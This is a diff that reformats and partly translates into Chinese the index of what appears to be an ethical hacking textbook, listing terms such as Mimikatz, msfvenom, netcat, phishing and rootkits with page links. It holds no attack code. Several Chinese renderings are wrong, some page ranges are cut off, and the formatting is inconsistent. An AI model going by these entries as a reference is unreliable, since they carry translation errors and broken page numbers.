+- Microsoft OneDrive, [619](#c15.xhtml#Page_619)
+- Microsoft Teams, [501](#c11.xhtml#Page_501)
+- Microsoft's Surface, [483](#c11.xhtml#Page_483)
+- Mimikatz, [537](#c12.xhtml#Page_537)
+- `mimikatz` module, [293](#c07.xhtml#Page_293)
+- misconfigurations, as a weakness of web applications, [642](#c15.xhtml#Page_642)–643
+- MIT (Massachusetts Institute of Technology), [114](#c04.xhtml#Page_114), [300](#c07.xhtml#Page_300)
+- mitigation, of risk, [69](#c03.xhtml#Page_69)
+- Mitnick, Ryan, [8](#c01.xhtml#Page_8)
+- MITRE, [163](#c05.xhtml#Page_163)
+- MITRE ATT&CK framework
+    - about, [10](#c01.xhtml#Page_10)–11, [72](#c03.xhtml#Page_72), [232](#c06.xhtml#Page_232)
+    - malware analysis and, [371](#c08.xhtml#Page_371)
+    - stages of, [73](#c03.xhtml#Page_73)–75
+    - website, [75](#c03.xhtml#Page_75)
+- mobile devices
+    - about, [499](#c11.xhtml#Page_499)–500
+    - attacks on, [500](#c11.xhtml#Page_500)–504
+- models
+    - for communication, [19](#c02.xhtml#Page_19)–24
+    - defined, [18](#c02.xhtml#Page_18)
+    - security, [584](#c14.xhtml#Page_584)–587
+- model‑view‑controller (MVC) design, [588](#c14.xhtml#Page_588)–589
+- `mod_security`, [525](#c12.xhtml#Page_525)
+- modules (Metasploit), [286](#c07.xhtml#Page_286)–289
+- MOM (manufacturing operational technology) systems, [654](#c15.xhtml#Page_654)
+- MongoDB, [597](#c14.xhtml#Page_597)
+- Morris, Robert T., [342](#c08.xhtml#Page_342)
+- Move Laterally stage, in life cycle, [536](#c12.xhtml#Page_536)
+- MPLS (Multiprotocol Label Switching), [45](#c02.xhtml#Page_45)
+- MQTT (Message Queuing Telemetry Transport), [52](#c02.xhtml#Page_52)
+- MS16‑032 vulnerability, [317](#c07.xhtml#Page_317)
+
+
+
+- `msfconsole` program, [190](#c05.xhtml#Page_190), [286](#c07.xhtml#Page_286)–289, [291](#c07.xhtml#Page_291), [375](#c08.xhtml#Page_375)
+- `msfvenom` program, [323](#c07.xhtml#Page_323)–324, [381](#c08.xhtml#Page_381)
+- MTU (maximum transmission unit), [395](#c09.xhtml#Page_395)
+- multifactor authentication (MFA), [603](#c14.xhtml#Page_603), [645](#c15.xhtml#Page_645)
+- Multiprotocol Label Switching (MPLS), [45](#c02.xhtml#Page_45)
+- multistation access units (MAUs), [26](#c02.xhtml#Page_26)
+- multitenancy, [615](#c15.xhtml#Page_615)
+- MVC (model‑view‑controller) design, [588](#c14.xhtml#Page_588)–589
+- MX (mail exchange) records, [132](#c04.xhtml#Page_132), [136](#c04.xhtml#Page_136)
+- MySQL, [520](#c12.xhtml#Page_520), [595](#c14.xhtml#Page_595)
+- NAC (network access control), [483](#c11.xhtml#Page_483)
+- name server (NS) records, [132](#c04.xhtml#Page_132), [135](#c04.xhtml#Page_135)
+- NASL (Network Attack Scripting Language) scripts, [209](#c05.xhtml#Page_209)
+- NAT (network address translation), [51](#c02.xhtml#Page_51)
+- National Institute of Standards and Technology (NIST)
+    - about, [70](#c03.xhtml#Page_70)–71, [556](#c13.xhtml#Page_556)
+    - Cybersecurity Framework, [599](#c14.xhtml#Page_599)
+    - 800‑207, [602](#c14.xhtml#Page_602)–603
+    - Special Publication 800‑53, [600](#c14.xhtml#Page_600)
+- National Security Agency (NSA), [209](#c05.xhtml#Page_209), [346](#c08.xhtml#Page_346), [358](#c08.xhtml#Page_358)
+- nation‑state actors, [8](#c01.xhtml#Page_8)
+- `nbstat`, [244](#c06.xhtml#Page_244), [245](#c06.xhtml#Page_245)–246
+- near‑field communication (NFC), [496](#c11.xhtml#Page_496)
+- Nessus, [203](#c05.xhtml#Page_203)–209, [286](#c07.xhtml#Page_286), [650](#c15.xhtml#Page_650)–651
+- `net` utility, [246](#c06.xhtml#Page_246)–247
+- NetBIOS Enumerator, [244](#c06.xhtml#Page_244), [249](#c06.xhtml#Page_249)–250
+- `netcat`, [319](#c07.xhtml#Page_319), [378](#c08.xhtml#Page_378), [648](#c15.xhtml#Page_648)
+- NetFlow, [541](#c12.xhtml#Page_541)
+- NetSpot, [485](#c11.xhtml#Page_485)
+- network access control (NAC), [483](#c11.xhtml#Page_483)
+- network address translation (NAT), [51](#c02.xhtml#Page_51)
+- Network Attack Scripting Language (NASL) scripts, [209](#c05.xhtml#Page_209)
+- network blocks, [645](#c15.xhtml#Page_645)
+- Network File Server (NFS), [237](#c06.xhtml#Page_237)
+- network IDS, [80](#c03.xhtml#Page_80)–83
+- network interface cards (NICs), [395](#c09.xhtml#Page_395)
+- Network layer (OSI model), [22](#c02.xhtml#Page_22)
+- network stacks. *See* [stacks](#b02.xhtml#ind1603)
+
+## 网络漏洞测试 (NVTs)
 
 NVTs, 195–198
 
@@ -15272,813 +16064,1080 @@ OWASP top ten vulnerabilities, 514–515, 642
 - 打包程序, 在静态分析中, 351–353
 - 包分析, 412–417
 - 包捕获
-
-- 关于, 394–395
-- Berkeley 包装器 (BPF), 408–410
-- 定义, 395
-- 端口镜像/跨越, 410
-- `tcpdump`, 395–401
-- `tshark`, 401–403
-- Wireshark, 403–408
-
+    - 关于, 394–395
+    - Berkeley 包装器 (BPF), 408–410
+    - 定义, 395
+    - 端口镜像/跨越, 410
+    - `tcpdump`, 395–401
+    - `tshark`, 401–403
+    - Wireshark, 403–408
 - 包捕获 (PCAP) 文件, 401
-
 - 包构建和操作
-
-- 关于, 210–211
-- `fragroute`, 217–218
-- `hping`, 211–214
-- packETH, 214–217
-
+    - 关于, 210–211
+    - `fragroute`, 217–218
+    - `hping`, 211–214
+    - packETH, 214–217
 - 包过滤器, 76–77
 - packETH 工具, 211, 214–217
 - 包, 31, 395
-
 - 双主密钥 (PMK), 480
-
 - 脉搏静脉扫描, 446
-
 - Parker, Donn, 65
-
 - Parkerian hexad, 65
-
 - Parrot OS, 494
-
 - 被动 DNS 侦察, 138–142
+- 被动侦察–144
+- 密码破解
+    - 关于，295–296
+    - John the Ripper，296–298
+    - Kerberoasting，300–304
+    - Rainbow Tables，298–300
+- 密码，收集，292–295
+- 载荷
+    - 定义，395
+    - 编码，380
+- 支付卡行业 (PCI)，45
+- PCAP (数据包捕获) 文件，401
+- PCI (支付卡行业)，45
+- PCRE (Perl 兼容正则表达式)，524
+- PDF (Portable Document Format)，网络钓鱼及，451
+- PDUs (协议数据单元)，29，395
+- PE Detective，352–353
+- Peach，308–313
+- PEAP (Protocol Extensible Authentication Protocol)，481
+- PeekYou，115
+- 渗透测试。*See* 伦理黑客
+- Penetration Testing Execution Standard (PTES)，6
+- 人员，开源情报 (OSI) 及，112–115
+- 句号 (.)，34
+- Perl 兼容正则表达式 (PCRE)，524
+- 持久性，322–326，385–386。*See also* 访问，在伦理黑客中维护
+- 持久性阶段，在 MITRE ATT&CK 框架中，10，73
+- 持久型跨站脚本，517
+- 个人健康信息 (PHI)，45，394–395
+- PGP (Pretty Good Privacy)，571–572
+- PHI (个人健康信息)，45，394–395
+- 网络钓鱼
+    - 关于，440，448–452
+    - 联系垃圾邮件，452
+    - 移动设备上，501
+    - 交换条件，452
+- 电话通话，作为物理社会工程，445–446
+- phreak，440
+- 物理控制，68
+- 物理层 (OSI 模型)，22
+- 物理网络
+    - 关于，29
+    - 地址，29–30
+    - 交换，30–31
+- 物理社会工程
+    - 关于，442
+    - 徽章访问，442–444
+    - 饵诱，447–448
+    - 生物特征，445–446
+    - 人阱，444–445
+    - 电话通话，446–447
+    - 尾随，448
+- Pikker，Hieki，362
+- ping 扫描
+    - 关于，163
+    - 使用 `fping`，163–165
+    - 使用 MegaPing，165–166
+- 跳转，319–322
+- PKI (公钥基础设施)，562
+- 平台即服务 (PaaS)，49–51，617，621
+- PLCs (可编程逻辑控制器)，652–653，654
+- Nessus 插件标签，205
+- PMK (pairwise master key)，480
+- 指针 (PTR) 记录，132，396
+- 政策，安全，69–70
+- 多态恶意软件，348
+- 多态性，219
+- POODLE 攻击，146
+- `popen()`，374
+- 端口镜像/跨越，410
+- 端口扫描
+    - 关于，162–163，167–168
+    - 详细信息，173–176
 
 
 
--   被动侦察–144
--   密码破解
-    -   关于，295–296
-    -   John the Ripper，296–298
-    -   Kerberoasting，300–304
-    -   Rainbow Tables，298–300
--   密码，收集，292–295
--   载荷
-    -   定义，395
-    -   编码，380
--   支付卡行业 (PCI)，45
--   PCAP (数据包捕获) 文件，401
--   PCI (支付卡行业)，45
--   PCRE (Perl 兼容正则表达式)，524
--   PDF (Portable Document Format)，网络钓鱼及，451
--   PDUs (协议数据单元)，29，395
--   PE Detective，352–353
--   Peach，308–313
--   PEAP (Protocol Extensible Authentication Protocol)，481
--   PeekYou，115
--   渗透测试。*See* 伦理黑客
--   Penetration Testing Execution Standard (PTES)，6
--   人员，开源情报 (OSI) 及，112–115
--   句号 (.)，34
--   Perl 兼容正则表达式 (PCRE)，524
--   持久性，322–326，385–386。*See also* 访问，在伦理黑客中维护
--   持久性阶段，在 MITRE ATT&CK 框架中，10，73
--   持久型跨站脚本，517
--   个人健康信息 (PHI)，45，394–395
--   PGP (Pretty Good Privacy)，571–572
--   PHI (个人健康信息)，45，394–395
--   网络钓鱼
-    -   关于，440，448–452
-    -   联系垃圾邮件，452
-    -   移动设备上，501
-    -   交换条件，452
--   电话通话，作为物理社会工程，445–446
--   phreak，440
--   物理控制，68
--   物理层 (OSI 模型)，22
--   物理网络
-    -   关于，29
-    -   地址，29–30
-    -   交换，30–31
--   物理社会工程
-    -   关于，442
-    -   徽章访问，442–444
-    -   饵诱，447–448
-    -   生物特征，445–446
-    -   人阱，444–445
-    -   电话通话，446–447
-    -   尾随，448
--   Pikker，Hieki，362
--   ping 扫描
-    -   关于，163
-    -   使用 `fping`，163–165
-    -   使用 MegaPing，165–166
--   跳转，319–322
--   PKI (公钥基础设施)，562
--   平台即服务 (PaaS)，49–51，617，621
--   PLCs (可编程逻辑控制器)，652–653，654
--   Nessus 插件标签，205
--   PMK (pairwise master key)，480
--   指针 (PTR) 记录，132，396
--   政策，安全，69–70
--   多态恶意软件，348
--   多态性，219
--   POODLE 攻击，146
--   `popen()`，374
--   端口镜像/跨越，410
--   端口扫描
-    -   关于，162–163，167–168
-    -   详细信息，173–176
-    -   `masscan`，184–185
-    -   MegaPing，185–186
-    -   Metasploit，188–190
-    -   `nmap`，168
-    -   脚本，176–181
-    -   TCP 扫描，168–171
-    -   UDP 扫描，171–173
-    -   Zenmap，181–184
--   Portable Document Format (PDF)，网络钓鱼及，451
--   `portmap` 服务，237
--   所有权 (控制)，在 Parkerian hexad 中，65
--   post exploitation
-    -   关于，313
-    -   隐藏痕迹，326
-    -   规避，313–314
-    -   隐藏数据，330–332
-    -   日志操作，329
-    -   持久性，322–326
-    -   跳转，319–322
-    -   特权提升，314–319
-    -   进程注入，327–329
-    -   rootkits，326–327
-    -   时间管理，332
--   POST 方法，384，631，635
--   Postel，Jon，106
--   Postman，649
--   可能不受欢迎的应用程序 (PUAs)，341
--   可能不受欢迎的程序 (PUPs)，341
--   PowerShell，307，314，537–538，632–633
--   PowerSploit，307–308
--   表示层
-    -   n‑tier 应用程序设计，589
-    -   OSI 模型，21
--   pre‑shared key (PSK)，459，478，480，553–554
--   pretexting，438–440
--   Pretty Good Privacy (PGP)，571–572
--   私有分类，583
--   私有云，623
--   特权提升
-    -   规避和，314–319
-    -   Linux，318–319
--   Privilege Escalation 阶段，在 MITRE ATT&CK 框架中，11，73–74
--   概率。*See* 风险
--   程序，71–72，626
--   process injection，327–329
--   可编程逻辑控制器 (PLCs)，652–653，654
--   程序，626
--   Project Athena，300
--   properties，在静态分析中，356
--   Protect function，在 NIST 网络安全框架中，600
--   protections
-    -   应用程序，535–536
-    -   检测和，223–224
-    -   Web 应用，524–526
--   protocol data units (PDUs)，29，395
--   Protocol Extensible Authentication Protocol (PEAP)，481
--   Protocol 字段，33
--   protocol stacks。*See* stacks
--   protocols，19–20
--   PSK (pre‑shared key)，459，478，480，553–554
--   PTES (Penetration Testing Execution Standard)，6
+- `masscan`，184–185
 
+- MegaPing，185–186
 
+- Metasploit，188–190
 
--   PTR (pointer) 记录，`132`，`396`
--   PUAs (potentially unwanted applications)，`341`
--   Public classification，`583`
--   public cloud，`623`
--   public key cryptography. *See* `asymmetric key cryptography`，`[#b02.xhtml#ind113]`
--   public key infrastructure (PKI)，`562`
--   PUPs (potentially unwanted programs)，`341`
--   Purdue model，`654`–655
--   PUT method，`631`，`635`
--   Python，`372`–374，`638`
--   QoD，`202`
--   quid pro quo，`452`
--   race condition，`67`
--   radio frequency identification (RFID)，`442`–443
--   Rain Forest Puppy Policy (RFP/RFPolicy)，`3`
--   Rainbow Crack project，`297`
--   Rainbow Tables，`298`–300
--   ransomware，`345`–347
--   Rapid7，`381`
--   `rcrack` program，`298`–299
--   RDP (Remote Desktop Protocol)，`51`
--   Real‑time Transport Protocol (RTP)，`79`
--   reciprocity，in theory of influence，`437`
--   Recon plugin，`144`
--   reconnaissance and footprinting 
-    -   about，`102`–103，`154`–156
-    -   answers to review questions，`666`–669
-    -   Domain Name System (DNS)，`129`–142
-    -   in ethical hacking，`12`
-    -   open source intelligence (OSI)，`103`–129
-    -   passive reconnaissance，`142`–144
-    -   review questions，`157`–160
-    -   technology intelligence，`150`–154
-    -   website intelligence，`145`–149
-    -   wireless，`484`–485
--   Reconnaissance stage 
-    -   in Lockheed Martin Cyber Kill Chain，`601`
-    -   in MITRE ATT&CK framework，`10`，`73`
--   Recover function，in NIST Cybersecurity Framework，`600`
--   recursive name query/resolution，`132`
--   red teaming. *See* `ethical hacking`，`[#b02.xhtml#ind494]`
--   reduction function，`298`
--   reflected cross‑site scripting，`517`
--   regex denial of service (ReDoS)，`525`
--   regional Internet registry (RIR)，`106`，`109`–112
--   related‑key attack，`558`
--   remote access，`45`–46
--   Remote Desktop Protocol (RDP)，`51`
--   Remote Method Invocation (RMI)，`237`，`239`–242，`591`
--   Remote Procedure Calls (RPCs) 
-    -   about，`236`–237，`591`
-    -   remote method invocation (RMI)，`239`–242
-    -   as a Session layer protocol，`22`
-    -   SunRPC，`237`–239
--   remote terminal units (RTUs)，`654`
--   Report tab (Nessus)，`205`–206
--   Representational State Transfer (REST)，`383`，`591`，`633`–638
--   request for comments (RFC)，`32`
--   Réseaux IP Européens Network Coordination Centre (RIPE NCC)，`110`
--   Reserved field，`38`
--   resource consumption，as an evasion technique，`220`
--   Resource Development stage，in MITRE ATT&CK framework，`10`，`73`
--   Respond function，in NIST Cybersecurity Framework，`600`
--   responsive design，`629`
--   REST (Representational State Transfer)，`383`，`591`，`633`–638
--   Restricted classification，`583`
--   retinal scanning，`446`
--   reverse connection，listening for with `netcat`，`319`
--   reverse lookup，`134`，`396`
--   review questions 
-    -   attack and defense，`543`–548
-    -   cloud computing，`657`–661
-    -   cryptography，`578`–580
-    -   enumeration，`274`–277
-    -   Internet of Things (IoT)，`657`–661
-    -   malware，`388`–391
-    -   networking，`56`–58
-    -   scanning networks，`226`–229
-    -   security，`96`–99
-    -   security architecture and design，`606`–609
-    -   sniffing，`430`–434
-    -   social engineering，`466`–470
-    -   system hacking，`334`–337
-    -   wireless security，`506`–509
--   REvil，`347`
--   revoked certificates，`565`
--   RFC (request for comments)，`32`
--   RFC 768，`41`
--   RFC 792，`42`
--   RFC 1918，`34`，`538`
--   RFC 3164，`91`
--   RFC 4861，`418`
--   RFC 5424，`91`
--   RFID (radio frequency identification)，`442`–443
--   RFP/RFPolicy (Rain Forest Puppy Policy)，`3`
--   Rijndael cipher，`556`
--   ring network，`26`
--   RIPE NCC (Réseaux IP Européens Network Coordination Centre)，`110`
--   RIR (regional Internet registry)，`106`，`109`–112
--   risk 
-    -   information assurance and，`66`–69
-    -   risk acceptance，`68`
-    -   risk avoidance，`69`
-    -   risk mitigation，`69`
-    -   risk transference，`68`–69
-    -   security architecture and，`599`
--   Rivest‑Shamir‑Adleman (RSA) algorithm，`559`
--   RMI (Remote Method Invocation)，`237`，`239`–242，`591`
--   `rmiregistry` program，`239`–242
--   rogue attacks，`457`–458
--   rootkits，`326`–327
--   rot13，`551`
--   `rpcbind` service，`237`
--   `rpcinfo`，`237`–238
--   RPCs (Remote Procedure Calls) 
-    -   about，`236`–237，`591`
-    -   remote method invocation (RMI)，`239`–242
-    -   as a Session layer protocol，`22`
-    -   SunRPC，`237`–239
--   RSA (Rivest‑Shamir‑Adleman) algorithm，`559`
--   RSA keys，`406`
--   RSA Lab，`624`
--   RST flag，`167`，`212`
--   `rtgen` program，using for Rainbow Tables，`297`–298
--   RTP (Real‑time Transport Protocol)，`79`
--   RTUs (remote terminal units)，`654`
--   Ruby，`378`
--   running 
-    -   scans，`198`
-    -   `sslstrip` in Ettercap，`426`
-    -   `tcpdump` without filters，`409`
+- `nmap`，168
 
+- 脚本，176–181
 
+- TCP 扫描，168–171
 
-*   Ryuk, [`#c08.xhtml#Page_347`]
+- UDP 扫描，171–173
+
+- Zenmap，181–184
+
+- Portable Document Format (PDF)，网络钓鱼及，451
+
+- `portmap` 服务，237
+
+- 所有权 (控制)，在 Parkerian hexad 中，65
+
+- post exploitation
+
+    - 关于，313
+
+    - 隐藏痕迹，326
+
+    - 规避，313–314
+
+    - 隐藏数据，330–332
+
+    - 日志操作，329
+
+    - 持久性，322–326
+
+    - 跳转，319–322
+
+    - 特权提升，314–319
+
+    - 进程注入，327–329
+
+    - rootkits，326–327
+
+    - 时间管理，332
+
+- POST 方法，384，631，635
+
+- Postel，Jon，106
+
+- Postman，649
+
+- 可能不受欢迎的应用程序 (PUAs)，341
+
+- 可能不受欢迎的程序 (PUPs)，341
+
+- PowerShell，307，314，537–538，632–633
+
+- PowerSploit，307–308
+
+- 表示层
+
+    - n‑tier 应用程序设计，589
+
+    - OSI 模型，21
+
+- pre‑shared key (PSK)，459，478，480，553–554
+
+- pretexting，438–440
+
+- Pretty Good Privacy (PGP)，571–572
+
+- 私有分类，583
+
+- 私有云，623
+
+- 特权提升
+
+    - 规避和，314–319
+
+    - Linux，318–319
+
+- Privilege Escalation 阶段，在 MITRE ATT&CK 框架中，11，73–74
+
+- 概率。*See* 风险
+
+- 程序，71–72，626
+
+- process injection，327–329
+
+- 可编程逻辑控制器 (PLCs)，652–653，654
+
+- 程序，626
+
+- Project Athena，300
+
+- properties，在静态分析中，356
+
+- Protect function，在 NIST 网络安全框架中，600
+
+- protections
+
+    - 应用程序，535–536
+
+    - 检测和，223–224
+
+    - Web 应用，524–526
+
+- protocol data units (PDUs)，29，395
+
+- Protocol Extensible Authentication Protocol (PEAP)，481
+
+- Protocol 字段，33
+
+- protocol stacks。*See* stacks
+
+- protocols，19–20
+
+- PSK (pre‑shared key)，459，478，480，553–554
+
+- PTES (Penetration Testing Execution Standard)，6
+
+- PTR (pointer) 记录，`132`，`396`
+
+- PUAs (potentially unwanted applications)，`341`
+
+- Public classification，`583`
+
+- public cloud，`623`
+
+- public key cryptography. *See* `asymmetric key cryptography`，`[#b02.xhtml#ind113]`
+
+- public key infrastructure (PKI)，`562`
+
+- PUPs (potentially unwanted programs)，`341`
+
+- Purdue model，`654`–655
+
+- PUT method，`631`，`635`
+
+- Python，`372`–374，`638`
+
+- QoD，`202`
+
+- quid pro quo，`452`
+
+- race condition，`67`
+
+- radio frequency identification (RFID)，`442`–443
+
+- Rain Forest Puppy Policy (RFP/RFPolicy)，`3`
+
+- Rainbow Crack project，`297`
+
+- Rainbow Tables，`298`–300
+
+- ransomware，`345`–347
+
+- Rapid7，`381`
+
+- `rcrack` program，`298`–299
+
+- RDP (Remote Desktop Protocol)，`51`
+
+- Real‑time Transport Protocol (RTP)，`79`
+
+- reciprocity，in theory of influence，`437`
+
+- Recon plugin，`144`
+
+- reconnaissance and footprinting
+
+    - about，`102`–103，`154`–156
+
+    - answers to review questions，`666`–669
+
+    - Domain Name System (DNS)，`129`–142
+
+    - in ethical hacking，`12`
+
+    - open source intelligence (OSI)，`103`–129
+
+    - passive reconnaissance，`142`–144
+
+    - review questions，`157`–160
+
+    - technology intelligence，`150`–154
+
+    - website intelligence，`145`–149
+
+    - wireless，`484`–485
+
+- Reconnaissance stage
+
+    - in Lockheed Martin Cyber Kill Chain，`601`
+
+    - in MITRE ATT&CK framework，`10`，`73`
+
+- Recover function，in NIST Cybersecurity Framework，`600`
+
+- recursive name query/resolution，`132`
+
+- red teaming. *See* `ethical hacking`，`[#b02.xhtml#ind494]`
+
+- reduction function，`298`
+
+- reflected cross‑site scripting，`517`
+
+- regex denial of service (ReDoS)，`525`
+
+- regional Internet registry (RIR)，`106`，`109`–112
+
+- related‑key attack，`558`
+
+- remote access，`45`–46
+
+- Remote Desktop Protocol (RDP)，`51`
+
+- Remote Method Invocation (RMI)，`237`，`239`–242，`591`
+
+- Remote Procedure Calls (RPCs)
+
+    - about，`236`–237，`591`
+
+    - remote method invocation (RMI)，`239`–242
+
+    - as a Session layer protocol，`22`
+
+    - SunRPC，`237`–239
+
+- remote terminal units (RTUs)，`654`
+
+- Report tab (Nessus)，`205`–206
+
+- Representational State Transfer (REST)，`383`，`591`，`633`–638
+
+- request for comments (RFC)，`32`
+
+- Réseaux IP Européens Network Coordination Centre (RIPE NCC)，`110`
+
+- Reserved field，`38`
+
+- resource consumption，as an evasion technique，`220`
+
+- Resource Development stage，in MITRE ATT&CK framework，`10`，`73`
+
+- Respond function，in NIST Cybersecurity Framework，`600`
+
+- responsive design，`629`
+
+- REST (Representational State Transfer)，`383`，`591`，`633`–638
+
+- Restricted classification，`583`
+
+- retinal scanning，`446`
+
+- reverse connection，listening for with `netcat`，`319`
+
+- reverse lookup，`134`，`396`
+
+- review questions
+
+    - attack and defense，`543`–548
+
+    - cloud computing，`657`–661
+
+    - cryptography，`578`–580
+
+    - enumeration，`274`–277
+
+    - Internet of Things (IoT)，`657`–661
+
+    - malware，`388`–391
+
+    - networking，`56`–58
+
+    - scanning networks，`226`–229
+
+    - security，`96`–99
+
+    - security architecture and design，`606`–609
+
+    - sniffing，`430`–434
+
+    - social engineering，`466`–470
+
+    - system hacking，`334`–337
+
+    - wireless security，`506`–509
+
+- REvil，`347`
+
+- revoked certificates，`565`
+
+- RFC (request for comments)，`32`
+
+- RFC 768，`41`
+
+- RFC 792，`42`
+
+- RFC 1918，`34`，`538`
+
+- RFC 3164，`91`
+
+- RFC 4861，`418`
+
+- RFC 5424，`91`
+
+- RFID (radio frequency identification)，`442`–443
+
+- RFP/RFPolicy (Rain Forest Puppy Policy)，`3`
+
+- Rijndael cipher，`556`
+
+- ring network，`26`
+
+- RIPE NCC (Réseaux IP Européens Network Coordination Centre)，`110`
+
+- RIR (regional Internet registry)，`106`，`109`–112
+
+- risk
+
+    - information assurance and，`66`–69
+
+    - risk acceptance，`68`
+
+    - risk avoidance，`69`
+
+    - risk mitigation，`69`
+
+    - risk transference，`68`–69
+
+    - security architecture and，`599`
+
+- Rivest‑Shamir‑Adleman (RSA) algorithm，`559`
+
+- RMI (Remote Method Invocation)，`237`，`239`–242，`591`
+
+- `rmiregistry` program，`239`–242
+
+- rogue attacks，`457`–458
+
+- rootkits，`326`–327
+
+- rot13，`551`
+
+- `rpcbind` service，`237`
+
+- `rpcinfo`，`237`–238
+
+- RPCs (Remote Procedure Calls)
+
+    - about，`236`–237，`591`
+
+    - remote method invocation (RMI)，`239`–242
+
+    - as a Session layer protocol，`22`
+
+    - SunRPC，`237`–239
+
+- RSA (Rivest‑Shamir‑Adleman) algorithm，`559`
+
+- RSA keys，`406`
+
+- RSA Lab，`624`
+
+- RST flag，`167`，`212`
+
+- `rtgen` program，using for Rainbow Tables，`297`–298
+
+- RTP (Real‑time Transport Protocol)，`79`
+
+- RTUs (remote terminal units)，`654`
+
+- Ruby，`378`
+
+- running
+
+    - scans，`198`
+
+    - `sslstrip` in Ettercap，`426`
+
+    - `tcpdump` without filters，`409`
+
+- Ryuk，[`#c08.xhtml#Page_347`]
 
 ## S
 
-*   S3 buckets, [`#c15.xhtml#Page_620`, `#c15.xhtml#Page_641`]–642
+- S3 buckets，[`#c15.xhtml#Page_620`，`#c15.xhtml#Page_641`]–642
 
-*   SAE (Simultaneous Authentication of Equals), [`#c11.xhtml#Page_482`]
+- SAE (Simultaneous Authentication of Equals)，[`#c11.xhtml#Page_482`]
 
-*   SAINT (Security Administrator's Integrated Network Tool), [`#c05.xhtml#Page_191`]–192
+- SAINT (Security Administrator's Integrated Network Tool)，[`#c05.xhtml#Page_191`]–192
+
+- Samba，[`#c06.xhtml#Page_243`，`#c06.xhtml#Page_255`]
+
+- sandboxing，[`#c08.xhtml#Page_361`，`#c11.xhtml#Page_501`]
+
+- SARA (Security Auditors Research Assistant)，[`#c05.xhtml#Page_191`]–192
+
+- SATAN (Security Analysis Tool for Auditing Networks)，[`#c05.xhtml#Page_191`]–192
+
+- Satori，[`#c04.xhtml#Page_152`]
+
+- SBC (session border controller)，[`#c03.xhtml#Page_79`]
+
+- SCADA (supervisory control and data acquisition)，[`#c15.xhtml#Page_652`]–653，[`#c15.xhtml#Page_654`]
+
+- scan configs，in OpenVAS，[`#c05.xhtml#Page_195`]–198
+
+- scanning
+
+    - Bluetooth，[`#c11.xhtml#Page_496`]–498
+
+    - in ethical hacking，[`#c01.xhtml#Page_12`]–13
+
+    - networks
+
+        - about，[`#c05.xhtml#Page_162`]–163，[`#c05.xhtml#Page_224`]–225
+
+        - answers to review questions，[`#b01.xhtml#Page_669`]–672
+
+        - evasion techniques，[`#c05.xhtml#Page_218`]–223
+
+        - packet crafting and manipulation，[`#c05.xhtml#Page_210`]–218
+
+        - ping sweeps，[`#c05.xhtml#Page_163`]–166
+
+        - port scanning，[`#c05.xhtml#Page_167`]–190
+
+        - protecting and detecting，[`#c05.xhtml#Page_223`]–224
+
+        - review questions，[`#c05.xhtml#Page_226`]–229
+
+        - vulnerability scanning，[`#c05.xhtml#Page_190`]–210
+
+
+
+- scarcity, in theory of influence, [`#c10.xhtml#Page_437`]
+- screen blindness, as an evasion technique, [`#c05.xhtml#Page_220`]
+- scripting, [`#c05.xhtml#Page_176`]–181
+- searching, for exploits, [`#c07.xhtml#Page_281`]–285
+- `searchsploit` tool, [`#c07.xhtml#Page_283`, `#c07.xhtml#Page_292`]
+- SEC (Securities and Exchange Commission), [`#c04.xhtml#Page_104`]
+- Secret classification, [`#c14.xhtml#Page_583`]
+- secure hash algorithm, [`#c07.xhtml#Page_297`]
+- Secure Hash Algorithm 1 (SHA‑1), [`#c13.xhtml#Page_570`]
+- Secure Hash Algorithm 2 (SHA‑2), [`#c13.xhtml#Page_570`]
+- Secure Sockets Layer (SSL)
+  - about, [`#c02.xhtml#Page_46`]
+  - for encryption, [`#c09.xhtml#Page_406`]
+  - for encryption for web‑based communication, [`#c03.xhtml#Page_62`]
+- secure state, [`#c14.xhtml#Page_586`]
+- Secure/Multipurpose Internet Mail Extensions (S/MIME), [`#c13.xhtml#Page_571`]–572
+- Securities and Exchange Commission (SEC), [`#c04.xhtml#Page_104`]
+- security
+  - about, [`#c03.xhtml#Page_60`, `#c03.xhtml#Page_95`]
+  - answers to review questions, [`#b01.xhtml#Page_663`]–666
+  - architecture and design
+    - about, [`#c14.xhtml#Page_582`, `#c14.xhtml#Page_598`]–602, [`#c14.xhtml#Page_604`]–605
+    - answers to review questions, [`#b01.xhtml#Page_693`]–695
+    - application architecture, [`#c14.xhtml#Page_587`]–598
+    - data classification, [`#c14.xhtml#Page_582`]–584
+    - review questions, [`#c14.xhtml#Page_606`]–609
+    - security architecture, [`#c14.xhtml#Page_588`]–604
+    - security models, [`#c14.xhtml#Page_584`]–587
+    - zero‑trust model, [`#c14.xhtml#Page_602`]–604
+  - auditing, [`#c03.xhtml#Page_93`]–95
+  - CIA triad, [`#c03.xhtml#Page_61`]–65
+  - defense‑in‑breadth approach, [`#c03.xhtml#Page_89`]–90
+  - defense‑in‑depth approach, [`#c03.xhtml#Page_87`]–89
+  - defensible network architecture, [`#c03.xhtml#Page_90`]–91
+  - guidelines, [`#c03.xhtml#Page_72`]
+  - information assurance and risk, [`#c03.xhtml#Page_66`]–69
+  - logging, [`#c03.xhtml#Page_91`]–93
+  - logging and monitoring failures, as one of OWASP top ten vulnerabilities, [`#c12.xhtml#Page_515`]
+  - misconfiguration, as one of OWASP top ten vulnerabilities, [`#c12.xhtml#Page_514`]
+  - models for, [`#c14.xhtml#Page_584`]–587
+  - organizing protections, [`#c03.xhtml#Page_72`]–75
+  - policies, [`#c03.xhtml#Page_69`]–70
+  - procedures, [`#c03.xhtml#Page_71`]–72
+  - review questions, [`#c03.xhtml#Page_96`]–99
+  - standards, [`#c03.xhtml#Page_70`]–71
+  - technology for, [`#c03.xhtml#Page_75`]–87
+  - wireless (*See* `wireless security`)
+- Security Administrator's Integrated Network Tool (SAINT), [`#c05.xhtml#Page_191`]–192
+- Security Analysis Tool for Auditing Networks (SATAN), [`#c05.xhtml#Page_191`]–192
+- Security Auditors Research Assistant (SARA), [`#c05.xhtml#Page_191`]–192
+- security control, [`#c14.xhtml#Page_599`]
+- security information and event management (SIEM), [`#c03.xhtml#Page_86`]–87, [`#c12.xhtml#Page_541`]
+- security operations center (SOC), [`#c03.xhtml#Page_86`]–87
+- segment, [`#c02.xhtml#Page_37`]
+- `SELECT` query, [`#c14.xhtml#Page_598`]
+- self‑propagation, [`#c08.xhtml#Page_342`]
+- self‑signed certificates, [`#c13.xhtml#Page_566`]–568
+- semi‑authorized entities, [`#c01.xhtml#Page_4`]
+- Sequence Number field, [`#c02.xhtml#Page_38`]
+- Server Message Block (SMB)
+  - about, [`#c01.xhtml#Page_13`, `#c05.xhtml#Page_180`, `#c05.xhtml#Page_209`, `#c06.xhtml#Page_232`, `#c06.xhtml#Page_242`]–243
